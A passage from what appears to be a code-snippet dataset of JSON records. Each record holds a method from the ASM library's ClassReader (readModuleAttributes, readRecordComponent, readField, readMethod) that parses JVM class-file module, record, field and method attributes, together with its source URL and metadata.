readTypeAnnotationTarget(context, currentAnnotationOffset);\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                classVisitor.visitTypeAnnotation(\n                    context.currentTypeAnnotationTarget,\n                    context.currentTypeAnnotationTargetPath,\n                    annotationDescriptor,\n                    /* visible = */ false),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the non standard attributes.\n    while (attributes != null) {\n      // Copy and reset the nextAttribute field so that it can also be used in ClassWriter.\n      Attribute nextAttribute = attributes.nextAttribute;\n      attributes.nextAttribute = null;\n      classVisitor.visitAttribute(attributes);\n      attributes = nextAttribute;\n    }\n\n    // Visit the NestedMembers attribute.\n    if (nestMembersOffset != 0) {\n      int numberOfNestMembers = readUnsignedShort(nestMembersOffset);\n      int currentNestMemberOffset = nestMembersOffset + 2;\n      while (numberOfNestMembers-- > 0) {\n        classVisitor.visitNestMember(readClass(currentNestMemberOffset, charBuffer));\n        currentNestMemberOffset += 2;\n      }\n    }\n\n    // Visit the PermittedSubtypes attribute.\n    if (permittedSubtypesOffset != 0) {\n      int numberOfPermittedSubtypes = readUnsignedShort(permittedSubtypesOffset);\n      int currentPermittedSubtypeOffset = permittedSubtypesOffset + 2;\n      while (numberOfPermittedSubtypes-- > 0) {\n        classVisitor.visitPermittedSubtypeExperimental(\n            readClass(currentPermittedSubtypeOffset, charBuffer));\n        currentPermittedSubtypeOffset += 2;\n      }\n    }\n\n    // Visit the InnerClasses attribute.\n    if (innerClassesOffset != 0) {\n      int numberOfClasses = readUnsignedShort(innerClassesOffset);\n      int currentClassesOffset = innerClassesOffset + 2;\n      while (numberOfClasses-- > 0) {\n        classVisitor.visitInnerClass(\n            readClass(currentClassesOffset, charBuffer),\n            readClass(currentClassesOffset + 2, charBuffer),\n            readUTF8(currentClassesOffset + 4, charBuffer),\n            readUnsignedShort(currentClassesOffset + 6));\n        currentClassesOffset += 8;\n      }\n    }\n\n    // Visit Record components.\n    if (recordOffset != 0) {\n      int recordComponentsCount = readUnsignedShort(recordOffset);\n      recordOffset += 2;\n      while (recordComponentsCount-- > 0) {\n        recordOffset = readRecordComponent(classVisitor, context, recordOffset);\n      }\n    }\n\n    // Visit the fields and methods.\n    int fieldsCount = readUnsignedShort(currentOffset);\n    currentOffset += 2;\n    while (fieldsCount-- > 0) {\n      currentOffset = readField(classVisitor, context, currentOffset);\n    }\n    int methodsCount = readUnsignedShort(currentOffset);\n    currentOffset += 2;\n    while (methodsCount-- > 0) {\n      currentOffset = readMethod(classVisitor, context, currentOffset);\n    }\n\n    // Visit the end of the class.\n    classVisitor.visitEnd();\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59265, "method_name": "readModuleAttributes", "class_name": "ClassReader", "params": ["ClassVisitor", "Context", "int", "int", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void readModuleAttributes(\n      final ClassVisitor classVisitor,\n      final Context context,\n      final int moduleOffset,\n      final int modulePackagesOffset,\n      final String moduleMainClass) {\n    char[] buffer = context.charBuffer;\n\n    // Read the module_name_index, module_flags and module_version_index fields and visit them.\n    int currentOffset = moduleOffset;\n    String moduleName = readModule(currentOffset, buffer);\n    int moduleFlags = readUnsignedShort(currentOffset + 2);\n    String moduleVersion = readUTF8(currentOffset + 4, buffer);\n    currentOffset += 6;\n    ModuleVisitor moduleVisitor = classVisitor.visitModule(moduleName, moduleFlags, moduleVersion);\n    if (moduleVisitor == null) {\n      return;\n    }\n\n    // Visit the ModuleMainClass attribute.\n    if (moduleMainClass != null) {\n      moduleVisitor.visitMainClass(moduleMainClass);\n    }\n\n    // Visit the ModulePackages attribute.\n    if (modulePackagesOffset != 0) {\n      int packageCount = readUnsignedShort(modulePackagesOffset);\n      int currentPackageOffset = modulePackagesOffset + 2;\n      while (packageCount-- > 0) {\n        moduleVisitor.visitPackage(readPackage(currentPackageOffset, buffer));\n        currentPackageOffset += 2;\n      }\n    }\n\n    // Read the 'requires_count' and 'requires' fields.\n    int requiresCount = readUnsignedShort(currentOffset);\n    currentOffset += 2;\n    while (requiresCount-- > 0) {\n      // Read the requires_index, requires_flags and requires_version fields and visit them.\n      String requires = readModule(currentOffset, buffer);\n      int requiresFlags = readUnsignedShort(currentOffset + 2);\n      String requiresVersion = readUTF8(currentOffset + 4, buffer);\n      currentOffset += 6;\n      moduleVisitor.visitRequire(requires, requiresFlags, requiresVersion);\n    }\n\n    // Read the 'exports_count' and 'exports' fields.\n    int exportsCount = readUnsignedShort(currentOffset);\n    currentOffset += 2;\n    while (exportsCount-- > 0) {\n      // Read the exports_index, exports_flags, exports_to_count and exports_to_index fields\n      // and visit them.\n      String exports = readPackage(currentOffset, buffer);\n      int exportsFlags = readUnsignedShort(currentOffset + 2);\n      int exportsToCount = readUnsignedShort(currentOffset + 4);\n      currentOffset += 6;\n      String[] exportsTo = null;\n      if (exportsToCount != 0) {\n        exportsTo = new String[exportsToCount];\n        for (int i = 0; i < exportsToCount; ++i) {\n          exportsTo[i] = readModule(currentOffset, buffer);\n          currentOffset += 2;\n        }\n      }\n      moduleVisitor.visitExport(exports, exportsFlags, exportsTo);\n    }\n\n    // Reads the 'opens_count' and 'opens' fields.\n    int opensCount = readUnsignedShort(currentOffset);\n    currentOffset += 2;\n    while (opensCount-- > 0) {\n      // Read the opens_index, opens_flags, opens_to_count and opens_to_index fields and visit them.\n      String opens = readPackage(currentOffset, buffer);\n      int opensFlags = readUnsignedShort(currentOffset + 2);\n      int opensToCount = readUnsignedShort(currentOffset + 4);\n      currentOffset += 6;\n      String[] opensTo = null;\n      if (opensToCount != 0) {\n        opensTo = new String[opensToCount];\n        for (int i = 0; i < opensToCount; ++i) {\n          opensTo[i] = readModule(currentOffset, buffer);\n          currentOffset += 2;\n        }\n      }\n      moduleVisitor.visitOpen(opens, opensFlags, opensTo);\n    }\n\n    // Read the 'uses_count' and 'uses' fields.\n    int usesCount = readUnsignedShort(currentOffset);\n    currentOffset += 2;\n    while (usesCount-- > 0) {\n      moduleVisitor.visitUse(readClass(currentOffset, buffer));\n      currentOffset += 2;\n    }\n\n    // Read the  'provides_count' and 'provides' fields.\n    int providesCount = readUnsignedShort(currentOffset);\n    currentOffset += 2;\n    while (providesCount-- > 0) {\n      // Read the provides_index, provides_with_count and provides_with_index fields and visit them.\n      String provides = readClass(currentOffset, buffer);\n      int providesWithCount = readUnsignedShort(currentOffset + 2);\n      currentOffset += 4;\n      String[] providesWith = new String[providesWithCount];\n      for (int i = 0; i < providesWithCount; ++i) {\n        providesWith[i] = readClass(currentOffset, buffer);\n        currentOffset += 2;\n      }\n      moduleVisitor.visitProvide(provides, providesWith);\n    }\n\n    // Visit the end of the module attributes.\n    moduleVisitor.visitEnd();\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59266, "method_name": "readRecordComponent", "class_name": "ClassReader", "params": ["ClassVisitor", "Context", "int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "  private int readRecordComponent(\n      final ClassVisitor classVisitor, final Context context, final int recordComponentOffset) {\n    char[] charBuffer = context.charBuffer;\n\n    int currentOffset = recordComponentOffset;\n    String name = readUTF8(currentOffset, charBuffer);\n    String descriptor = readUTF8(currentOffset + 2, charBuffer);\n    currentOffset += 4;\n\n    // Read the record component attributes (the variables are ordered as in Section 4.7 of the\n    // JVMS).\n\n    // Attribute offsets exclude the attribute_name_index and attribute_length fields.\n    // - The string corresponding to the Signature attribute, or null.\n    String signature = null;\n    // - The offset of the RuntimeVisibleAnnotations attribute, or 0.\n    int runtimeVisibleAnnotationsOffset = 0;\n    // - The offset of the RuntimeInvisibleAnnotations attribute, or 0.\n    int runtimeInvisibleAnnotationsOffset = 0;\n    // - The offset of the RuntimeVisibleTypeAnnotations attribute, or 0.\n    int runtimeVisibleTypeAnnotationsOffset = 0;\n    // - The offset of the RuntimeInvisibleTypeAnnotations attribute, or 0.\n    int runtimeInvisibleTypeAnnotationsOffset = 0;\n    // - The non standard attributes (linked with their {@link Attribute#nextAttribute} field).\n    //   This list in the <i>reverse order</i> or their order in the ClassFile structure.\n    Attribute attributes = null;\n\n    int attributesCount = readUnsignedShort(currentOffset);\n    currentOffset += 2;\n    while (attributesCount-- > 0) {\n      // Read the attribute_info's attribute_name and attribute_length fields.\n      String attributeName = readUTF8(currentOffset, charBuffer);\n      int attributeLength = readInt(currentOffset + 2);\n      currentOffset += 6;\n      // The tests are sorted in decreasing frequency order (based on frequencies observed on\n      // typical classes).\n      if (Constants.SIGNATURE.equals(attributeName)) {\n        signature = readUTF8(currentOffset, charBuffer);\n      } else if (Constants.RUNTIME_VISIBLE_ANNOTATIONS.equals(attributeName)) {\n        runtimeVisibleAnnotationsOffset = currentOffset;\n      } else if (Constants.RUNTIME_VISIBLE_TYPE_ANNOTATIONS.equals(attributeName)) {\n        runtimeVisibleTypeAnnotationsOffset = currentOffset;\n      } else if (Constants.RUNTIME_INVISIBLE_ANNOTATIONS.equals(attributeName)) {\n        runtimeInvisibleAnnotationsOffset = currentOffset;\n      } else if (Constants.RUNTIME_INVISIBLE_TYPE_ANNOTATIONS.equals(attributeName)) {\n        runtimeInvisibleTypeAnnotationsOffset = currentOffset;\n      } else {\n        Attribute attribute =\n            readAttribute(\n                context.attributePrototypes,\n                attributeName,\n                currentOffset,\n                attributeLength,\n                charBuffer,\n                -1,\n                null);\n        attribute.nextAttribute = attributes;\n        attributes = attribute;\n      }\n      currentOffset += attributeLength;\n    }\n\n    RecordComponentVisitor recordComponentVisitor =\n        classVisitor.visitRecordComponent(name, descriptor, signature);\n    if (recordComponentVisitor == null) {\n      return currentOffset;\n    }\n\n    // Visit the RuntimeVisibleAnnotations attribute.\n    if (runtimeVisibleAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeVisibleAnnotationsOffset);\n      int currentAnnotationOffset = runtimeVisibleAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                recordComponentVisitor.visitAnnotation(annotationDescriptor, /* visible = */ true),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the RuntimeInvisibleAnnotations attribute.\n    if (runtimeInvisibleAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeInvisibleAnnotationsOffset);\n      int currentAnnotationOffset = runtimeInvisibleAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                recordComponentVisitor.visitAnnotation(annotationDescriptor, /* visible = */ false),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the RuntimeVisibleTypeAnnotations attribute.\n    if (runtimeVisibleTypeAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeVisibleTypeAnnotationsOffset);\n      int currentAnnotationOffset = runtimeVisibleTypeAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the target_type, target_info and target_path fields.\n        currentAnnotationOffset = readTypeAnnotationTarget(context, currentAnnotationOffset);\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                recordComponentVisitor.visitTypeAnnotation(\n                    context.currentTypeAnnotationTarget,\n                    context.currentTypeAnnotationTargetPath,\n                    annotationDescriptor,\n                    /* visible = */ true),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the RuntimeInvisibleTypeAnnotations attribute.\n    if (runtimeInvisibleTypeAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeInvisibleTypeAnnotationsOffset);\n      int currentAnnotationOffset = runtimeInvisibleTypeAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the target_type, target_info and target_path fields.\n        currentAnnotationOffset = readTypeAnnotationTarget(context, currentAnnotationOffset);\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                recordComponentVisitor.visitTypeAnnotation(\n                    context.currentTypeAnnotationTarget,\n                    context.currentTypeAnnotationTargetPath,\n                    annotationDescriptor,\n                    /* visible = */ false),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the non standard attributes.\n    while (attributes != null) {\n      // Copy and reset the nextAttribute field so that it can also be used in FieldWriter.\n      Attribute nextAttribute = attributes.nextAttribute;\n      attributes.nextAttribute = null;\n      recordComponentVisitor.visitAttribute(attributes);\n      attributes = nextAttribute;\n    }\n\n    // Visit the end of the field.\n    recordComponentVisitor.visitEnd();\n    return currentOffset;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59267, "method_name": "readField", "class_name": "ClassReader", "params": ["ClassVisitor", "Context", "int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "  private int readField(\n      final ClassVisitor classVisitor, final Context context, final int fieldInfoOffset) {\n    char[] charBuffer = context.charBuffer;\n\n    // Read the access_flags, name_index and descriptor_index fields.\n    int currentOffset = fieldInfoOffset;\n    int accessFlags = readUnsignedShort(currentOffset);\n    String name = readUTF8(currentOffset + 2, charBuffer);\n    String descriptor = readUTF8(currentOffset + 4, charBuffer);\n    currentOffset += 6;\n\n    // Read the field attributes (the variables are ordered as in Section 4.7 of the JVMS).\n    // Attribute offsets exclude the attribute_name_index and attribute_length fields.\n    // - The value corresponding to the ConstantValue attribute, or null.\n    Object constantValue = null;\n    // - The string corresponding to the Signature attribute, or null.\n    String signature = null;\n    // - The offset of the RuntimeVisibleAnnotations attribute, or 0.\n    int runtimeVisibleAnnotationsOffset = 0;\n    // - The offset of the RuntimeInvisibleAnnotations attribute, or 0.\n    int runtimeInvisibleAnnotationsOffset = 0;\n    // - The offset of the RuntimeVisibleTypeAnnotations attribute, or 0.\n    int runtimeVisibleTypeAnnotationsOffset = 0;\n    // - The offset of the RuntimeInvisibleTypeAnnotations attribute, or 0.\n    int runtimeInvisibleTypeAnnotationsOffset = 0;\n    // - The non standard attributes (linked with their {@link Attribute#nextAttribute} field).\n    //   This list in the <i>reverse order</i> or their order in the ClassFile structure.\n    Attribute attributes = null;\n\n    int attributesCount = readUnsignedShort(currentOffset);\n    currentOffset += 2;\n    while (attributesCount-- > 0) {\n      // Read the attribute_info's attribute_name and attribute_length fields.\n      String attributeName = readUTF8(currentOffset, charBuffer);\n      int attributeLength = readInt(currentOffset + 2);\n      currentOffset += 6;\n      // The tests are sorted in decreasing frequency order (based on frequencies observed on\n      // typical classes).\n      if (Constants.CONSTANT_VALUE.equals(attributeName)) {\n        int constantvalueIndex = readUnsignedShort(currentOffset);\n        constantValue = constantvalueIndex == 0 ? null : readConst(constantvalueIndex, charBuffer);\n      } else if (Constants.SIGNATURE.equals(attributeName)) {\n        signature = readUTF8(currentOffset, charBuffer);\n      } else if (Constants.DEPRECATED.equals(attributeName)) {\n        accessFlags |= Opcodes.ACC_DEPRECATED;\n      } else if (Constants.SYNTHETIC.equals(attributeName)) {\n        accessFlags |= Opcodes.ACC_SYNTHETIC;\n      } else if (Constants.RUNTIME_VISIBLE_ANNOTATIONS.equals(attributeName)) {\n        runtimeVisibleAnnotationsOffset = currentOffset;\n      } else if (Constants.RUNTIME_VISIBLE_TYPE_ANNOTATIONS.equals(attributeName)) {\n        runtimeVisibleTypeAnnotationsOffset = currentOffset;\n      } else if (Constants.RUNTIME_INVISIBLE_ANNOTATIONS.equals(attributeName)) {\n        runtimeInvisibleAnnotationsOffset = currentOffset;\n      } else if (Constants.RUNTIME_INVISIBLE_TYPE_ANNOTATIONS.equals(attributeName)) {\n        runtimeInvisibleTypeAnnotationsOffset = currentOffset;\n      } else {\n        Attribute attribute =\n            readAttribute(\n                context.attributePrototypes,\n                attributeName,\n                currentOffset,\n                attributeLength,\n                charBuffer,\n                -1,\n                null);\n        attribute.nextAttribute = attributes;\n        attributes = attribute;\n      }\n      currentOffset += attributeLength;\n    }\n\n    // Visit the field declaration.\n    FieldVisitor fieldVisitor =\n        classVisitor.visitField(accessFlags, name, descriptor, signature, constantValue);\n    if (fieldVisitor == null) {\n      return currentOffset;\n    }\n\n    // Visit the RuntimeVisibleAnnotations attribute.\n    if (runtimeVisibleAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeVisibleAnnotationsOffset);\n      int currentAnnotationOffset = runtimeVisibleAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                fieldVisitor.visitAnnotation(annotationDescriptor, /* visible = */ true),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the RuntimeInvisibleAnnotations attribute.\n    if (runtimeInvisibleAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeInvisibleAnnotationsOffset);\n      int currentAnnotationOffset = runtimeInvisibleAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                fieldVisitor.visitAnnotation(annotationDescriptor, /* visible = */ false),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the RuntimeVisibleTypeAnnotations attribute.\n    if (runtimeVisibleTypeAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeVisibleTypeAnnotationsOffset);\n      int currentAnnotationOffset = runtimeVisibleTypeAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the target_type, target_info and target_path fields.\n        currentAnnotationOffset = readTypeAnnotationTarget(context, currentAnnotationOffset);\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                fieldVisitor.visitTypeAnnotation(\n                    context.currentTypeAnnotationTarget,\n                    context.currentTypeAnnotationTargetPath,\n                    annotationDescriptor,\n                    /* visible = */ true),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the RuntimeInvisibleTypeAnnotations attribute.\n    if (runtimeInvisibleTypeAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeInvisibleTypeAnnotationsOffset);\n      int currentAnnotationOffset = runtimeInvisibleTypeAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the target_type, target_info and target_path fields.\n        currentAnnotationOffset = readTypeAnnotationTarget(context, currentAnnotationOffset);\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                fieldVisitor.visitTypeAnnotation(\n                    context.currentTypeAnnotationTarget,\n                    context.currentTypeAnnotationTargetPath,\n                    annotationDescriptor,\n                    /* visible = */ false),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the non standard attributes.\n    while (attributes != null) {\n      // Copy and reset the nextAttribute field so that it can also be used in FieldWriter.\n      Attribute nextAttribute = attributes.nextAttribute;\n      attributes.nextAttribute = null;\n      fieldVisitor.visitAttribute(attributes);\n      attributes = nextAttribute;\n    }\n\n    // Visit the end of the field.\n    fieldVisitor.visitEnd();\n    return currentOffset;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59268, "method_name": "readMethod", "class_name": "ClassReader", "params": ["ClassVisitor", "Context", "int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "  private int readMethod(\n      final ClassVisitor classVisitor, final Context context, final int methodInfoOffset) {\n    char[] charBuffer = context.charBuffer;\n\n    // Read the access_flags, name_index and descriptor_index fields.\n    int currentOffset = methodInfoOffset;\n    context.currentMethodAccessFlags = readUnsignedShort(currentOffset);\n    context.currentMethodName = readUTF8(currentOffset + 2, charBuffer);\n    context.currentMethodDescriptor = readUTF8(currentOffset + 4, charBuffer);\n    currentOffset += 6;\n\n    // Read the method attributes (the variables are ordered as in Section 4.7 of the JVMS).\n    // Attribute offsets exclude the attribute_name_index and attribute_length fields.\n    // - The offset of the Code attribute, or 0.\n    int codeOffset = 0;\n    // - The offset of the Exceptions attribute, or 0.\n    int exceptionsOffset = 0;\n    // - The strings corresponding to the Exceptions attribute, or null.\n    String[] exceptions = null;\n    // - Whether the method has a Synthetic attribute.\n    boolean synthetic = false;\n    // - The constant pool index contained in the Signature attribute, or 0.\n    int signatureIndex = 0;\n    // - The offset of the RuntimeVisibleAnnotations attribute, or 0.\n    int runtimeVisibleAnnotationsOffset = 0;\n    // - The offset of the RuntimeInvisibleAnnotations attribute, or 0.\n    int runtimeInvisibleAnnotationsOffset = 0;\n    // - The offset of the RuntimeVisibleParameterAnnotations attribute, or 0.\n    int runtimeVisibleParameterAnnotationsOffset = 0;\n    // - The offset of the RuntimeInvisibleParameterAnnotations attribute, or 0.\n    int runtimeInvisibleParameterAnnotationsOffset = 0;\n    // - The offset of the RuntimeVisibleTypeAnnotations attribute, or 0.\n    int runtimeVisibleTypeAnnotationsOffset = 0;\n    // - The offset of the RuntimeInvisibleTypeAnnotations attribute, or 0.\n    int runtimeInvisibleTypeAnnotationsOffset = 0;\n    // - The offset of the AnnotationDefault attribute, or 0.\n    int annotationDefaultOffset = 0;\n    // - The offset of the MethodParameters attribute, or 0.\n    int methodParametersOffset = 0;\n    // - The non standard attributes (linked with their {@link Attribute#nextAttribute} field).\n    //   This list in the <i>reverse order</i> or their order in the ClassFile structure.\n    Attribute attributes = null;\n\n    int attributesCount = readUnsignedShort(currentOffset);\n    currentOffset += 2;\n    while (attributesCount-- > 0) {\n      // Read the attribute_info's attribute_name and attribute_length fields.\n      String attributeName = readUTF8(currentOffset, charBuffer);\n      int attributeLength = readInt(currentOffset + 2);\n      currentOffset += 6;\n      // The tests are sorted in decreasing frequency order (based on frequencies observed on\n      // typical classes).\n      if (Constants.CODE.equals(attributeName)) {\n        if ((context.parsingOptions & SKIP_CODE) == 0) {\n          codeOffset = currentOffset;\n        }\n      } else if (Constants.EXCEPTIONS.equals(attributeName)) {\n        exceptionsOffset = currentOffset;\n        exceptions = new String[readUnsignedShort(exceptionsOffset)];\n        int currentExceptionOffset = exceptionsOffset + 2;\n        for (int i = 0; i < exceptions.length; ++i) {\n          exceptions[i] = readClass(currentExceptionOffset, charBuffer);\n          currentExceptionOffset += 2;\n        }\n      } else if (Constants.SIGNATURE.equals(attributeName)) {\n        signatureIndex = readUnsignedShort(currentOffset);\n      } else if (Constants.DEPRECATED.equals(attributeName)) {\n        context.currentMethodAccessFlags |= Opcodes.ACC_DEPRECATED;\n      } else if (Constants.RUNTIME_VISIBLE_ANNOTATIONS.equals(attributeName)) {\n        runtimeVisibleAnnotationsOffset = currentOffset;\n      } else if (Constants.RUNTIME_VISIBLE_TYPE_ANNOTATIONS.equals(attributeName)) {\n        runtimeVisibleTypeAnnotationsOffset = currentOffset;\n      } else if (Constants.ANNOTATION_DEFAULT.equals(attributeName)) {\n        annotationDefaultOffset = currentOffset;\n      } else if (Constants.SYNTHETIC.equals(attributeName)) {\n        synthetic = true;\n        context.currentMethodAccessFlags |= Opcodes.ACC_SYNTHETIC;\n      } else if (Constants.RUNTIME_INVISIBLE_ANNOTATIONS.equals(attributeName)) {\n        runtimeInvisibleAnnotationsOffset = currentOffset;\n      } else if (Constants.RUNTIME_INVISIBLE_TYPE_ANNOTATIONS.equals(attributeName)) {\n        runtimeInvisibleTypeAnnotationsOffset = currentOffset;\n      } else if (Constants.RUNTIME_VISIBLE_PARAMETER_ANNOTATIONS.equals(attributeName)) {\n        runtimeVisibleParameterAnnotationsOffset = currentOffset;\n      } else if (Constants.RUNTIME_INVISIBLE_PARAMETER_ANNOTATIONS.equals(attributeName)) {\n        runtimeInvisibleParameterAnnotationsOffset = currentOffset;\n      } else if (Constants.METHOD_PARAMETERS.equals(attributeName)) {\n        methodParametersOffset = currentOffset;\n      } else {\n        Attribute attribute =\n            readAttribute(\n                context.attributePrototypes,\n                attributeName,\n                currentOffset,\n                attributeLength,\n                charBuffer,\n                -1,\n                null);\n        attribute.nextAttribute = attributes;\n        attributes = attribute;\n      }\n      currentOffset += attributeLength;\n    }\n\n    // Visit the method declaration.\n    MethodVisitor methodVisitor =\n        classVisitor.visitMethod(\n            context.currentMethodAccessFlags,\n            context.currentMethodName,\n            context.currentMethodDescriptor,\n            signatureIndex == 0 ? null : readUtf(signatureIndex, charBuffer),\n            exceptions);\n    if (methodVisitor == null) {\n      return currentOffset;\n    }\n\n    // If the returned MethodVisitor is in fact a MethodWriter, it means there is no method\n    // adapter between the reader and the writer. In this case, it might be possible to copy\n    // the method attributes directly into the writer. If so, return early without visiting\n    // the content of these attributes.\n    if (methodVisitor instanceof MethodWriter) {\n      MethodWriter methodWriter = (MethodWriter) methodVisitor;\n      if (methodWriter.canCopyMethodAttributes(\n          this,\n          synthetic,\n          (context.currentMethodAccessFlags & Opcodes.ACC_DEPRECATED) != 0,\n          readUnsignedShort(methodInfoOffset + 4),\n          signatureIndex,\n          exceptionsOffset)) {\n        methodWriter.setMethodAttributesSource(methodInfoOffset, currentOffset - methodInfoOffset);\n        return currentOffset;\n      }\n    }\n\n    // Visit the MethodParameters attribute.\n    if (methodParametersOffset != 0 && (context.parsingOptions & SKIP_DEBUG) == 0) {\n      int parametersCount = readByte(methodParametersOffset);\n      int currentParameterOffset = methodParametersOffset + 1;\n      while (parametersCount-- > 0) {\n        // Read the name_index and access_flags fields and visit them.\n        methodVisitor.visitParameter(\n            readUTF8(currentParameterOffset, charBuffer),\n            readUnsignedShort(currentParameterOffset + 2));\n        currentParameterOffset += 4;\n      }\n    }\n\n    // Visit the AnnotationDefault attribute.\n    if (annotationDefaultOffset != 0) {\n      AnnotationVisitor annotationVisitor = methodVisitor.visitAnnotationDefault();\n      readElementValue(annotationVisitor, annotationDefaultOffset, null, charBuffer);\n      if (annotationVisitor != null) {\n        annotationVisitor.visitEnd();\n      }\n    }\n\n    // Visit the RuntimeVisibleAnnotations attribute.\n    if (runtimeVisibleAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeVisibleAnnotationsOffset);\n      int currentAnnotationOffset = runtimeVisibleAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                methodVisitor.visitAnnotation(annotationDescriptor, /* visible = */ true),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the RuntimeInvisibleAnnotations attribute.\n    if (runtimeInvisibleAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeInvisibleAnnotationsOffset);\n      int currentAnnotationOffset = runtimeInvisibleAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n        currentAnnotationOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentAnnotationOffset =\n            readElementValues(\n                methodVisitor.visitAnnotation(annotationDescriptor, /* visible = */ false),\n                currentAnnotationOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n\n    // Visit the RuntimeVisibleTypeAnnotations attribute.\n    if (runtimeVisibleTypeAnnotationsOffset != 0) {\n      int numAnnotations = readUnsignedShort(runtimeVisibleTypeAnnotationsOffset);\n      int currentAnnotationOffset = runtimeVisibleTypeAnnotationsOffset + 2;\n      while (numAnnotations-- > 0) {\n        // Parse the target_type, target_info and target_path 